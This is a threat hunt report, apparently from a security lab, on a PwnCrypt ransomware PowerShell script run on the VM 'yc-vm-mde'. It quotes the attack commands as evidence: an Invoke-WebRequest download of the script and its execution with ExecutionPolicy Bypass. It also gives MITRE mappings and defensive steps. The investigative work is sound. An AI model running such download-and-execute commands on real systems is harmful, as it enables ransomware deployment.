
# Threat Hunt Report: PwnCrypt Ransomware on `yc-vm-mde`

## Who
- **Device:** `yc-vm-mde`
- **Account Involved:** `SYSTEM`
- **Executing Process:** `powershell.exe`, launched via `cmd.exe`

## When
- **Initial Script Download:** June 1, 2025
- **Execution Time:** June 1, 2025, 16:13:50 (4:13:50 PM)

## Where
- **Script Path:** `C:\ProgramData\pwncrypt.ps1`
- **Execution Origin:**  
  ```powershell
  powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1
  ```

## What
- The system executed a PowerShell script named `pwncrypt.ps1`, a known ransomware payload, using:
  ```powershell
  powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1
  ```
- This action was preceded by a web download using:
  ```powershell
  Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../pwncrypt.ps1
  ```

## Why (MITRE Techniques)

| Tactic              | Technique                                | ID         |
|---------------------|-------------------------------------------|------------|
| Execution           | PowerShell Execution                      | T1059.001  |
| Ingress Tool Transfer | Script Download via Invoke-WebRequest | T1105      |
| Defense Evasion     | ExecutionPolicy Bypass                    | T1562.001  |
| Impact (attempted)  | File Encryption for Impact (not observed) | T1486 (suspected) |

## Summary
The ransomware `pwncrypt.ps1` was successfully downloaded and executed on the target device. However, no encrypted files with the `.pwncrypt.` extension were observed, and no evidence of data impact was detected in `DeviceFileEvents`. This suggests:
- The script may have failed during execution
- Endpoint protection may have blocked the encryption stage
- Or the script was executed in a limited or dry-run mode

## Recommended Actions
1. **Isolate Device:** Prevent potential spread if this was a test phase.
2. **Delete Script:** Manually remove `C:\programdata\pwncrypt.ps1`
3. **Block Download URL:** Add `raw.githubusercontent.com` to Defender URL blocklists if not already monitored.
4. **Run AV Scan:** Check for residual artifacts or persistence mechanisms.
5. **Monitor:** Enable alerting for any future `.pwncrypt.` or PowerShell abuse.
